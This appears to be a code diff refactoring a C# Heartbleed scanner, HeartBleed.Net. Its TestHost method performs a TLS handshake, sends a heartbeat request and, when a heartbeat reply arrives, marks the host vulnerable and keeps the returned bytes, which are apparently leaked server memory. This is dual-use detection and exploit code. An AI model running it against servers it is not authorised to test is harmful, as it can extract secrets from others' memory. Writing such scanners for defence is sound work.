@@ -16,6 +16,7 @@ using System.Linq;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading.Tasks;
+using System.Diagnostics;
 
 namespace HeartBleed.Net
 {
@@ -106,13 +107,6 @@ namespace HeartBleed.Net
             return result;
         }
 
-        public class ReceiveDataResult
-        {
-            public bool Success { get; set; }
-            public ushort Length { get; set; }
-            public byte[] Buffer { get; set; }
-        }
-
         private static async Task<ReceiveDataResult> ReceiveData(Socket socket, ushort length)
         {
             byte[] buffer = new byte[length];
@@ -122,18 +116,27 @@ namespace HeartBleed.Net
             int remaining = length;
             int readCount = 0;
 
-            socket.ReceiveTimeout = 5000;
+            socket.ReceiveTimeout = 500;
 
             await Task.Run(() =>
             {
-                while (offset < length)
+                while (offset < length && success)
                 {
-                    int receive = socket.Receive(buffer, offset, remaining, SocketFlags.None);
+                    int receive = 0;
+                    try
+                    {
+                        receive = socket.Receive(buffer, offset, remaining, SocketFlags.None);
+                    }
+                    catch (System.Net.Sockets.SocketException)
+                    {
+                        Log.Error("Socket Exception");
+                        success = false;
+                    }
 
                     offset += receive;
                     remaining -= receive;
 
-                    if (readCount++ == 10)
+                    if (readCount++ == 5)
                     {
                         Log.Information("Too many consecutive reads");
                         success = false;
@@ -144,102 +147,132 @@ namespace HeartBleed.Net
             return new ReceiveDataResult { Success = success, Length = length, Buffer = buffer};
         }
 
-        public async Task<bool> TestHost(string host, int port = 443, SSLVersion sslVersion = SSLVersion.TLS1_2_VERSION)
+        public async Task<TestResult> TestHost(string host, int port = 443, SSLVersion sslVersion = SSLVersion.TLS1_2_VERSION)
         {
-            using (Socket socket = new Socket(SocketType.Stream, ProtocolType.IP))
+            TestResult result = new TestResult { Host = host, Port = port, Status = VulnerabilityStatus.Unknown };
+
+            if (string.IsNullOrWhiteSpace(host))
             {
-                Log.Information("Trying " + sslVersion + "...");
-                Log.Information("Connecting...");
+                result.Status = VulnerabilityStatus.Failed;
+                return result;
+            }
+            
+            Stopwatch stopwatch = new Stopwatch();
+            stopwatch.Start();
+            try
+            {
 
-                socket.Connect(host, port);
-
-                Log.Information("Sending Client Hello...");
-                await Task.Run(() =>
+                using (Socket socket = new Socket(SocketType.Stream, ProtocolType.IP))
                 {
-                    byte[] hello = GetHello(sslVersion);
-                    if (socket.Send(hello) != hello.Length)
+                    Log.Information("Trying " + sslVersion + "...");
+                    Log.Information("Connecting...");
+
+                    socket.Connect(host, port);
+
+                    Log.Information("Sending Client Hello...");
+                    await Task.Run(() =>
                     {
-                        Log.Error("Error while sending HELLO");
-                    }
-                });
-
-                bool done = false;
-
-                Log.Information("Waiting for Server Hello...");
-                while (!done)
-                {
-                    ReceiveHeaderResult receiveHeader = await ReceiveHeader(socket);
-                    if (!receiveHeader.Success)
-                    {
-                        Log.Error("Error while receiving header");
-                        return false;
-                    }
-
-                    Log.Information("Receive Header {Type} {Version} {Length}", (SSLHeaderType)receiveHeader.Type, (SSLVersion)receiveHeader.Version, receiveHeader.Length);
-
-                    ReceiveDataResult receiveData = await ReceiveData(socket, receiveHeader.Length);
-                    if (!receiveData.Success)
-                    {
-                        Log.Error("Error while receiving data");
-                        return false;
-                    }
-
-                    if ((SSLHeaderType)receiveHeader.Type == SSLHeaderType.SSL3_RT_HANDSHAKE)
-                    {
-                        int offset = 0;
-                        // This code will handle situations against IIS etc with multiple handshakes
-                        while (!done && offset < receiveHeader.Length)
+                        byte[] hello = GetHello(sslVersion);
+                        if (socket.Send(hello) != hello.Length)
                         {
-                            SSLHandshakeType handshake = (SSLHandshakeType)receiveData.Buffer[offset];
-                            if (handshake == SSLHandshakeType.SSL3_MT_SERVER_DONE)
-                                done = true;
+                            Log.Error("Error while sending HELLO");
+                            result.Status = VulnerabilityStatus.Failed;
+                        }
+                    });
 
-                            int handshakeLength = ((receiveData.Buffer[offset + 1] << 16) | (receiveData.Buffer[offset + 2] << 8) | receiveData.Buffer[offset + 3]);
+                    bool done = false;
 
-                            Log.Information("Receive Data {Type} {Length}", (SSLHandshakeType)handshake, handshakeLength);
+                    Log.Information("Waiting for Server Hello...");
+                    while (!done)
+                    {
+                        ReceiveHeaderResult receiveHeader = await ReceiveHeader(socket);
+                        if (!receiveHeader.Success)
+                        {
+                            Log.Error("Error while receiving header");
+                            result.Status = VulnerabilityStatus.Failed;
+                            return result;
+                        }
 
-                            offset += 4; // skip header
-                            offset += handshakeLength;
+                        Log.Information("Receive Header {Type} {Version} {Length}", (SSLHeaderType)receiveHeader.Type, (SSLVersion)receiveHeader.Version, receiveHeader.Length);
+
+                        ReceiveDataResult receiveData = await ReceiveData(socket, receiveHeader.Length);
+                        if (!receiveData.Success)
+                        {
+                            Log.Error("Error while receiving data");
+                            result.Status = VulnerabilityStatus.Failed;
+                            return result;
+                        }
+
+                        if ((SSLHeaderType)receiveHeader.Type == SSLHeaderType.SSL3_RT_HANDSHAKE)
+                        {
+                            int offset = 0;
+                            // This code will handle situations against IIS etc with multiple handshakes
+                            while (!done && offset < receiveHeader.Length)
+                            {
+                                SSLHandshakeType handshake = (SSLHandshakeType)receiveData.Buffer[offset];
+                                if (handshake == SSLHandshakeType.SSL3_MT_SERVER_DONE)
+                                    done = true;
+
+                                int handshakeLength = ((receiveData.Buffer[offset + 1] << 16) | (receiveData.Buffer[offset + 2] << 8) | receiveData.Buffer[offset + 3]);
+
+                                Log.Information("Receive Data {Type} {Length}", (SSLHandshakeType)handshake, handshakeLength);
+
+                                offset += 4; // skip header
+                                offset += handshakeLength;
+                            }
                         }
                     }
+
+                    byte[] heartbeat = GetHeartBeat(sslVersion);
+
+                    Log.Information("Sending heartbeat request...");
+                    if (socket.Send(heartbeat) != heartbeat.Length)
+                    {
+                        Log.Error("Error while sending HEARTBEAT");
+                        result.Status = VulnerabilityStatus.Failed;
+                        return result;
+                    }
+
+                    Log.Information("Waiting for heartbeat response...");
+                    ReceiveHeaderResult receiveHeartBeatHeader = await ReceiveHeader(socket);
+                    if (!receiveHeartBeatHeader.Success)
+                    {
+                        Log.Error("Error while heartbeat response header");
+                        result.Status = VulnerabilityStatus.Failed;
+                        return result;
+                    }
+
+                    if (receiveHeartBeatHeader.Type != (byte)SSLHeaderType.SSL3_RT_HEARTBEAT)
+                    {
+                        Log.Information("Invalid HEARTBEAT response.  Got {Response} ({Type})", receiveHeartBeatHeader.Type, (SSLHeaderType)receiveHeartBeatHeader.Type);
+                        result.Status = VulnerabilityStatus.NotVulnerable;
+                        return result;
+                    }
+
+                    ReceiveDataResult receiveHeartBeatData = await ReceiveData(socket, receiveHeartBeatHeader.Length);
+                    if (!receiveHeartBeatData.Success)
+                    {
+                        Log.Error("Error while receiving data");
+                        result.Status = VulnerabilityStatus.Failed;
+                        return result;
+                    }
+
+                    socket.Close();
+
+                    //Log.Information("{HexDump}", Utility.HexDump(receiveHeartBeatData.Buffer));
+                    result.Status = VulnerabilityStatus.Vulnerable;
+                    result.Data = receiveHeartBeatData.Buffer;
                 }
 
-                byte[] heartbeat = GetHeartBeat(sslVersion);
-
-                Log.Information("Sending heartbeat request...");
-                if (socket.Send(heartbeat) != heartbeat.Length)
-                {
-                    Log.Error("Error while sending HEARTBEAT");
-                    return false;
-                }
-
-                Log.Information("Waiting for heartbeat response...");
-                ReceiveHeaderResult receiveHeartBeatHeader = await ReceiveHeader(socket);
-                if (!receiveHeartBeatHeader.Success)
-                {
-                    Log.Error("Error while heartbeat response header");
-                    return false;
-                }
-
-                if (receiveHeartBeatHeader.Type != (byte)SSLHeaderType.SSL3_RT_HEARTBEAT)
-                {
-                    Log.Error("Invalid HEARTBEAT response.  Got {Response} ({Type})", receiveHeartBeatHeader.Type, (SSLHeaderType)receiveHeartBeatHeader.Type);
-                    return false;
-                }
-
-                ReceiveDataResult receiveHeartBeatData = await ReceiveData(socket, receiveHeartBeatHeader.Length);
-                if (!receiveHeartBeatData.Success)
-                {
-                    Log.Error("Error while receiving data");
-                    return false;
-                }
-
-                socket.Close();
-
-                Log.Information("{HexDump}", Utility.HexDump(receiveHeartBeatData.Buffer));
-
-                return true;
             }
+            finally
+            {
+                stopwatch.Stop();
+            }
+
+            result.ElapsedTime = stopwatch.Elapsed;
+            
+            return result;
         }
     }
 }
